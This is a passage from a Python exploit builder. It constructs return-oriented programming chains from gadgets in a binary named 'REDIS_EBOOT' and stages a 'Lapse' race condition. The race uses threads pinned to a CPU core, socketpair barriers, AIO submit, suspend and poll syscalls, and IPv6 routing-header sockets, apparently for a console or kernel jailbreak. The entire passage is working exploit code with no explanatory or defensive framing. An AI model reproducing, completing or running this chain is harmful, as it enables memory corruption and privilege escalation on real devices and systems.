                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()
                for q in (
                    0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + result_off,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                    resume_addr,
                ):
                    segment.extend(pack64(q))
                msg[segment_off:segment_off + len(segment)] = segment

            if args.lowrop_lapse_thread_start != "none":
                emit_thread_syscall(0x1C7, [msg_addr + thr_args_off, 0x68, 0, 0, 0, 0], 0x30, 0x1200)
                for i in range(8):
                    emit_thread_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x80 + i * 8, 0x1280 + i * 0x80)

        elif lowrop_lapse_suspend_preflight:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT

            active_pipe_off = 0x200
            barrier_pipe_off = 0x208
            read_fd_qword_off = 0x210
            write_fd_qword_off = 0x218
            req_off = 0x220
            aio_id_off = 0x260
            poll_state_off = 0x270
            worker_state_off = 0x274
            pipe_buf_off = 0x278
            rtprio_off = 0x280
            cpumask_off = 0x288
            thr_args_off = 0x580
            child_tid_off = 0x610
            parent_tid_off = 0x618
            thread_stack_off = 0x700
            thread_stack_size = 0x800
            thread_rop_off = 0x1000
            tls_off = 0x2700
            tls_size = 0x80
            worker_segments = []

            struct.pack_into("<I", msg, cpumask_off, 1 << 4)
            struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size, args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
            struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size + 8, msg_addr + thread_rop_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x00, args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
            struct.pack_into("<Q", msg, thr_args_off + 0x08, 0)
            struct.pack_into("<Q", msg, thr_args_off + 0x10, msg_addr + thread_stack_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x18, thread_stack_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x20, msg_addr + tls_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x28, tls_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x30, msg_addr + child_tid_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x38, msg_addr + parent_tid_off)

            thread = bytearray()

            def thread_q(value):
                thread.extend(pack64(value))

            def thread_pop_rdx_padded(value):
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
                thread_q(value)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                thread.extend(b"ROP")
                thread_q(0)

            def thread_rax_to_rdi():
                thread_q(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    thread_q(0)

            def thread_emit_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    thread_q(value[1])
                    thread_q(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    thread_rax_to_rdi()
                else:
                    thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    thread_q(value & 0xFFFFFFFFFFFFFFFF)

            def thread_store_imm64(dst_addr, value):
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                thread_q(dst_addr)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                thread_q(value)
                thread_q(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def thread_syscall(sysno, supplied, result_off, segment_off):
                segment_addr = msg_addr + segment_off
                worker_segments.append(segment_off)

                thread_q(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                thread_q(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                thread_q(0)
                thread_q(0)
                thread_q(0)
                thread_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                thread_q(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                thread_emit_rdi_arg(supplied[0])
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                thread_q(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                thread_q(sysno & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                thread_q(segment_addr)

                resume_addr = msg_addr + thread_rop_off + len(thread)
                segment = bytearray()
                for q in (
                    0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + result_off,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                    resume_addr,
                ):
                    segment.extend(pack64(q))
                msg[segment_off:segment_off + len(segment)] = segment

            thread_syscall(0x1E8, [3, 1, 0xFFFFFFFFFFFFFFFF, 0x10, msg_addr + cpumask_off, 0], 0x80, 0x1400)
            thread_syscall(0x1D2, [1, 0, msg_addr + rtprio_off, 0, 0, 0], 0x88, 0x1480)
            thread_store_imm64(msg_addr + 0x38, 1)
            thread_syscall(0x003, [("mem64", msg_addr + read_fd_qword_off), msg_addr + pipe_buf_off, 1, 0, 0, 0], 0x90, 0x1500)
            thread_syscall(0x296, [msg_addr + aio_id_off, 1, msg_addr + worker_state_off, 0, 0, 0], 0x98, 0x1580)
            thread_store_imm64(msg_addr + 0x40, 1)
            thread_syscall(0x1AF, [0, 0, 0, 0, 0, 0], 0xA0, 0x1600)
            msg[thread_rop_off:thread_rop_off + len(thread)] = thread

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            for segment_off in worker_segments:
                emit_store_qword(msg_addr + segment_off, msg_addr + 0x08)

            def emit_rax_to_rdi():
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    emitq(0)

            def emit_main_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_worker_syscall(sysno, supplied, result_off, segment_off, post_ops=None):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x08)

                if not lowrop_lapse_race_rthdr:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.dispatch_fd)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    emitq(msg_addr)
                    emit_pop_rdx_padded(0)
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emit_main_rdi_arg(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()

                def sq(value):
                    segment.extend(pack64(value))

                def sdword(src_addr, dst_addr):
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(src_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(dst_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET)

                sq(0)
                sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                sq(msg_addr + result_off)
                sq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                if post_ops == "active_socketpair_fd_to_aio_req":
                    sdword(msg_addr + active_pipe_off, msg_addr + req_off + 0x20)
                elif post_ops == "barrier_socketpair_fds_to_slots":
                    sdword(msg_addr + barrier_pipe_off, msg_addr + read_fd_qword_off)
                    sdword(msg_addr + barrier_pipe_off + 4, msg_addr + write_fd_qword_off)
                sq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                sq(resume_addr)
                msg[segment_off:segment_off + len(segment)] = segment

            emit_worker_syscall(0x087, [1, 1, 0, msg_addr + active_pipe_off, 0, 0], 0x20, 0x1800, "active_socketpair_fd_to_aio_req")
            emit_worker_syscall(0x087, [1, 1, 0, msg_addr + barrier_pipe_off, 0, 0], 0x28, 0x1880, "barrier_socketpair_fds_to_slots")
            emit_worker_syscall(0x29D, [1, msg_addr + req_off, 1, 3, msg_addr + aio_id_off, 0], 0x30, 0x1980)
            emit_worker_syscall(0x1C7, [msg_addr + thr_args_off, 0x68, 0, 0, 0, 0], 0x48, 0x1A00)
            for i in range(4):
                emit_worker_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0xA8 + i * 8, 0x1A80 + i * 0x80)
            emit_worker_syscall(0x004, [("mem64", msg_addr + write_fd_qword_off), msg_addr + pipe_buf_off, 1, 0, 0, 0], 0x50, 0x1C80)
            emit_worker_syscall(0x278, [("mem64", msg_addr + child_tid_off), 0, 0, 0, 0, 0], 0x58, 0x1D80)
            emit_worker_syscall(0x298, [msg_addr + aio_id_off, 1, msg_addr + poll_state_off, 0, 0, 0], 0x60, 0x1E00)
            emit_worker_syscall(0x279, [("mem64", msg_addr + child_tid_off), 0, 0, 0, 0, 0], 0x68, 0x1E80)
            for i in range(6):
                emit_worker_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0xD0 + i * 8, 0x1F00 + i * 0x80)

        elif lowrop_lapse_race_one or lowrop_lapse_race_rthdr:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT

            server_addr_off = 0x200
            sockbuf_off = 0x1F0
            addr_len_off = 0x214
            reuse_off = 0x218
            linger_off = 0x220
            barrier_pipe_off = 0x228
            read_fd_qword_off = 0x230
            write_fd_qword_off = 0x238
            ack_pipe_off = 0x240
            tcp_info_len_off = 0x248
            tcp_info_off = 0x250
            reqs_off = 0x380
            aio_ids_off = 0x400
            target_id_off = aio_ids_off + lowrop_lapse_target_req_index * 4
            cancel_state_off = 0x420
            poll_all_state_off = 0x430
            poll_target_state_off = 0x440
            main_state_off = 0x444
            worker_state_off = 0x448
            pipe_buf_off = 0x450
            ack_read_fd_qword_off = 0x460
            ack_write_fd_qword_off = 0x468
            ack_buf_off = 0x470
            ack_after_marker_off = 0x128
            worker_park_read_ret_off = 0x148
            ack_pollfd_off = ack_read_fd_qword_off
            sockbuf_client_ret_off = 0x5A0
            sockbuf_conn_ret_off = 0x5A8
            client_fill_ret_off = 0x5B0
            conn_drain_ret_off = 0x5B8
            sleep_ts_off = 0x480
            pre_sleep_ts_off = 0x490
            pre_barrier_sleep_ts_off = 0x560
            rtprio_off = 0x580
            cpumask_off = 0x588
            block_pipe_off = 0x5C0
            block_reqs_off = 0x6A0
            block_id_off = 0x6F0
            thr_args_off = 0x600
            child_tid_off = 0x690
            parent_tid_off = 0x698
            thread_stack_off = 0x700
            thread_stack_size = 0x800
            thread_rop_off = 0x1000
            tls_off = (
                0x1900
                if (lowrop_lapse_uses_ack_pipe or lowrop_lapse_worker_ready_ack)
                else 0x1880
                if lowrop_lapse_race_rthdr
                else 0x3280
            )
            tls_size = 0x80
            rthdr_count = lowrop_lapse_rthdr_count if lowrop_lapse_race_rthdr else 0
            rthdr_sds_base = 0x1A00 if (lowrop_lapse_uses_ack_pipe or lowrop_lapse_worker_ready_ack) else 0x1900
            rthdr_segment_floor = lowrop_lapse_rthdr_segment_floor + (
                lowrop_lapse_pre_suspend_yields
                + (1 if lowrop_lapse_pre_suspend_sleep_ns else 0)
                + lowrop_lapse_pre_suspend_getpid_loops
                + (1 if lowrop_lapse_worker_after_read_ack else 0)
                + lowrop_lapse_post_poll_yields
                + (1 if lowrop_lapse_conn_drain_len else 0)
            ) * 0x80
            rthdr_layout = lapse_rthdr_layout(
                rthdr_count,
                rthdr_sds_base,
                (
                    lowrop_lapse_post_resume_yields + (1 if lowrop_lapse_uses_ack_signal else 0)
                    + (1 if lowrop_lapse_post_resume_sleep_ns else 0)
                    if lowrop_lapse_race_rthdr
                    else 0
                ),
                lowrop_lapse_rthdr_set_loops if lowrop_lapse_race_rthdr else 1,
                rthdr_segment_floor if lowrop_lapse_race_rthdr else None,
            ) if lowrop_lapse_race_rthdr else {}
            rthdr_sds_off = rthdr_layout.get("sds_off", 0)
            rthdr_set_ret_off = rthdr_layout.get("set_ret_off", 0)
            rthdr_get_ret_off = rthdr_layout.get("get_ret_off", 0)
            rthdr_marker_off = rthdr_layout.get("marker_off", 0)
            rthdr_optlen_off = rthdr_layout.get("optlen_off", 0)
            rthdr_buf_off = rthdr_layout.get("rthdr_buf_off", 0)
            rthdr_getbuf_off = rthdr_layout.get("getbuf_off", 0)
            rthdr_segment_stride = rthdr_layout.get("segment_stride", 0x80)
            worker_segments = []

            struct.pack_into("<I", msg, tcp_info_len_off, 0x100)
            struct.pack_into("<Q", msg, sleep_ts_off, lowrop_lapse_post_resume_sleep_ns // 1_000_000_000)
            struct.pack_into("<Q", msg, sleep_ts_off + 8, lowrop_lapse_post_resume_sleep_ns % 1_000_000_000)
            struct.pack_into("<Q", msg, pre_sleep_ts_off, lowrop_lapse_pre_suspend_sleep_ns // 1_000_000_000)
            struct.pack_into("<Q", msg, pre_sleep_ts_off + 8, lowrop_lapse_pre_suspend_sleep_ns % 1_000_000_000)
            struct.pack_into("<Q", msg, pre_barrier_sleep_ts_off, lowrop_lapse_pre_barrier_sleep_ns // 1_000_000_000)
            struct.pack_into("<Q", msg, pre_barrier_sleep_ts_off + 8, lowrop_lapse_pre_barrier_sleep_ns % 1_000_000_000)
            if lowrop_lapse_sockbuf_size:
                struct.pack_into("<I", msg, sockbuf_off, lowrop_lapse_sockbuf_size)
            if lowrop_lapse_block_workers:
                for i in range(lowrop_lapse_block_worker_count):
                    req_off = block_reqs_off + i * 0x28
                    struct.pack_into("<I", msg, req_off + 0x08, 1)
                    struct.pack_into("<I", msg, req_off + 0x20, 0xFFFFFFFF)
            if lowrop_lapse_worker_ack_poll_ms:
                struct.pack_into("<h", msg, ack_pollfd_off + 4, 1)
            # Match the Y2JB Lapse pinning setup: MAIN_CORE=4, setsize=0x10.
            # A zero mask makes cpuset_setaffinity fail with EINVAL.
            struct.pack_into("<I", msg, cpumask_off, 1 << 4)
            struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size, args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
            struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size + 8, msg_addr + thread_rop_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x00, args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
            struct.pack_into("<Q", msg, thr_args_off + 0x08, 0)
            struct.pack_into("<Q", msg, thr_args_off + 0x10, msg_addr + thread_stack_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x18, thread_stack_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x20, msg_addr + tls_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x28, tls_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x30, msg_addr + child_tid_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x38, msg_addr + parent_tid_off)

            thread = bytearray()

            def thread_q(value):
                thread.extend(pack64(value))

            def thread_pop_rdx_padded(value):
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
                thread_q(value)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                thread.extend(b"ROP")
                thread_q(0)

            def thread_rax_to_rdi():
                thread_q(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    thread_q(0)

            def thread_emit_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    thread_q(value[1])
                    thread_q(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    thread_rax_to_rdi()
                else:
                    thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    thread_q(value & 0xFFFFFFFFFFFFFFFF)

            def thread_store_imm64(dst_addr, value):
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                thread_q(dst_addr)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                thread_q(value)
                thread_q(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def thread_syscall(sysno, supplied, result_off, segment_off):
                segment_addr = msg_addr + segment_off
                worker_segments.append(segment_off)

                thread_q(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                thread_q(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                thread_q(0)
                thread_q(0)
                thread_q(0)
                thread_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                thread_q(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                thread_emit_rdi_arg(supplied[0])
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                thread_q(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                thread_q(sysno & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                thread_q(segment_addr)

                resume_addr = msg_addr + thread_rop_off + len(thread)
                segment = bytearray()
                for q in (
                    0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + result_off,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                    resume_addr,
                ):
                    segment.extend(pack64(q))
                msg[segment_off:segment_off + len(segment)] = segment

            thread_syscall(0x1E8, [3, 1, 0xFFFFFFFFFFFFFFFF, lowrop_lapse_cpuset_size, msg_addr + cpumask_off, 0], 0xE0, 0x1600)
            thread_syscall(0x1D2, [1, 0, msg_addr + rtprio_off, 0, 0, 0], 0xE8, 0x1680)
            thread_store_imm64(msg_addr + 0xD8, 1)
            if lowrop_lapse_worker_ready_pipe:
                thread_syscall(0x004, [("mem64", msg_addr + ack_write_fd_qword_off), msg_addr + ack_buf_off, 1, 0, 0, 0], 0x138, 0x1800)
            elif lowrop_lapse_worker_ready_ack:
                thread_syscall(0x004, [("mem64", msg_addr + read_fd_qword_off), msg_addr + ack_buf_off, 1, 0, 0, 0], 0x138, 0x1800)
            thread_syscall(0x003, [("mem64", msg_addr + read_fd_qword_off), msg_addr + pipe_buf_off, 1, 0, 0, 0], 0xF0, 0x1700)
            if lowrop_lapse_worker_after_read_ack:
                thread_syscall(0x004, [("mem64", msg_addr + ack_write_fd_qword_off), msg_addr + ack_buf_off, 1, 0, 0, 0], 0x138, 0x1800)
            thread_syscall(0x296, [msg_addr + target_id_off, 1, msg_addr + worker_state_off, 0, 0, 0], 0xF8, 0x1780)
            thread_store_imm64(msg_addr + 0x100, 1)
            if lowrop_lapse_uses_ack_signal:
                ack_signal_write_fd_off = ack_write_fd_qword_off if lowrop_lapse_uses_ack_pipe else write_fd_qword_off
                thread_syscall(0x004, [("mem64", msg_addr + ack_signal_write_fd_off), msg_addr + ack_buf_off, 1, 0, 0, 0], 0x108, 0x1800)
                if lowrop_lapse_worker_ack_poll_ms:
                    thread_store_imm64(msg_addr + ack_after_marker_off, 1)
            if lowrop_lapse_worker_ack:
                thread_syscall(0x1AF, [0, 0, 0, 0, 0, 0], 0x128, 0x1880)
            elif lowrop_lapse_worker_ready_ack:
                if lowrop_lapse_worker_park:
                    thread_syscall(0x003, [("mem64", msg_addr + read_fd_qword_off), msg_addr + pipe_buf_off, 1, 0, 0, 0], 0x108, 0x1880)
                else:
                    thread_syscall(0x1AF, [0, 0, 0, 0, 0, 0], 0x108, 0x1880)
            elif lowrop_lapse_worker_after_read_ack:
                if lowrop_lapse_worker_park:
                    thread_syscall(0x003, [("mem64", msg_addr + read_fd_qword_off), msg_addr + pipe_buf_off, 1, 0, 0, 0], 0x108, 0x1880)
                else:
                    thread_syscall(0x1AF, [0, 0, 0, 0, 0, 0], 0x108, 0x1880)
            elif lowrop_lapse_worker_park:
                # Keep the worker alive after the delete marker instead of
                # letting its synthetic thread unwind through thr_exit.
                park_ret_off = worker_park_read_ret_off if lowrop_lapse_worker_ack_poll_ms else 0x108
                park_segment_off = 0x1880 if lowrop_lapse_worker_ack_poll_ms else 0x1800
                thread_syscall(0x003, [("mem64", msg_addr + read_fd_qword_off), msg_addr + pipe_buf_off, 1, 0, 0, 0], park_ret_off, park_segment_off)
            else:
                thread_syscall(0x1AF, [0, 0, 0, 0, 0, 0], 0x108, 0x1800)
            if thread_rop_off + len(thread) > tls_off:
                raise RuntimeError(
                    "lapse worker ROP overlaps TLS/rthdr area: "
                    f"thread_end=0x{thread_rop_off + len(thread):X} tls_off=0x{tls_off:X}"
                )
            msg[thread_rop_off:thread_rop_off + len(thread)] = thread

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            for segment_off in worker_segments:
                emit_store_qword(msg_addr + segment_off, msg_addr + 0x08)

            def emit_rax_to_rdi():
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    emitq(0)

            def emit_main_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_lapse_syscall(sysno, supplied, result_off, segment_off, post_ops=None):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x08)

                if not lowrop_lapse_race_rthdr:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.dispatch_fd)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    emitq(msg_addr)
                    emit_pop_rdx_padded(0)
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emit_main_rdi_arg(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()

                def sq(value):
                    segment.extend(pack64(value))

                def sdword(src_addr, dst_addr):
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(src_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(dst_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET)

                sq(0)
                sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                sq(msg_addr + result_off)
                sq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                if post_ops == "client_fd_to_target_req":
                    sdword(
                        msg_addr + 0x48,
                        msg_addr + reqs_off + lowrop_lapse_target_req_index * 0x28 + 0x20,
                    )
                elif post_ops == "barrier_socketpair_fds_to_slots":
                    sdword(msg_addr + barrier_pipe_off, msg_addr + read_fd_qword_off)
                    sdword(msg_addr + barrier_pipe_off + 4, msg_addr + write_fd_qword_off)
                    if lowrop_lapse_worker_ack_poll_ms:
                        sdword(msg_addr + barrier_pipe_off, msg_addr + ack_pollfd_off)
                elif post_ops == "ack_socketpair_fds_to_slots":
                    sdword(msg_addr + ack_pipe_off, msg_addr + ack_read_fd_qword_off)
                    sdword(msg_addr + ack_pipe_off + 4, msg_addr + ack_write_fd_qword_off)
                    if lowrop_lapse_worker_ack_poll_ms:
                        sdword(msg_addr + ack_pipe_off, msg_addr + ack_pollfd_off)
                elif post_ops == "block_socketpair_fd_to_reqs":
                    sdword(msg_addr + block_pipe_off, msg_addr + block_reqs_off + 0x20)
                    if lowrop_lapse_block_worker_count > 1:
                        sdword(msg_addr + block_pipe_off, msg_addr + block_reqs_off + 0x28 + 0x20)
                elif isinstance(post_ops, tuple) and post_ops[0] == "copy_rthdr_marker":
                    idx = post_ops[1]
                    sdword(
                        msg_addr + rthdr_getbuf_off + idx * 0x80 + 4,
                        msg_addr + rthdr_marker_off + idx * 8,
                    )
                sq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                sq(resume_addr)
                msg[segment_off:segment_off + len(segment)] = segment

            def emit_lapse_send_msg():
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(len(msg))
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

            if lowrop_lapse_prezero_r9_once:
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

            if lowrop_lapse_debug_sends:
                emit_store_imm64(msg_addr + 0x18, 10)
                emit_lapse_send_msg()

            rthdr_segment_off = rthdr_layout["segment_off"] if lowrop_lapse_race_rthdr else 0
            if lowrop_lapse_race_rthdr:
                if lowrop_lapse_block_workers:
                    emit_lapse_syscall(
                        0x087,
                        [1, 1, 0, msg_addr + block_pipe_off, 0, 0],
                        0x170,
                        0x1E80,
                        "block_socketpair_fd_to_reqs",
                    )
                    emit_lapse_syscall(
                        0x29D,
                        [1, msg_addr + block_reqs_off, lowrop_lapse_block_worker_count, 3, msg_addr + block_id_off, 0],
                        0x178,
                        0x1F00,
                    )
                # Match Y2JB's setup shape: keep the IPv6 sockets alive before
                # the AIO race, then allocate/fetch rthdr state after the race.
                for i in range(rthdr_count):
                    emit_lapse_syscall(
                        0x061,
                        [28, 2, 17, 0, 0, 0],
                        rthdr_sds_off + i * 8,
                        rthdr_segment_off,
                    )
                    rthdr_segment_off += rthdr_segment_stride

            if lowrop_lapse_debug_sends:
                emit_store_imm64(msg_addr + 0x18, 11)
                emit_lapse_send_msg()

            if lowrop_lapse_main_prio_pin:
                emit_lapse_syscall(0x1E8, [3, 1, 0xFFFFFFFFFFFFFFFF, lowrop_lapse_cpuset_size, msg_addr + cpumask_off, 0], 0x160, 0x1E80)
                emit_lapse_syscall(0x1D2, [1, 0, msg_addr + rtprio_off, 0, 0, 0], 0x168, 0x1F00)

            emit_lapse_syscall(0x061, [2, 1, 0, 0, 0, 0], 0x20, 0x2000)
            emit_lapse_syscall(0x069, [("mem64", msg_addr + 0x20), 0xFFFF, 4, msg_addr + reuse_off, 4, 0], 0x28, 0x2080)
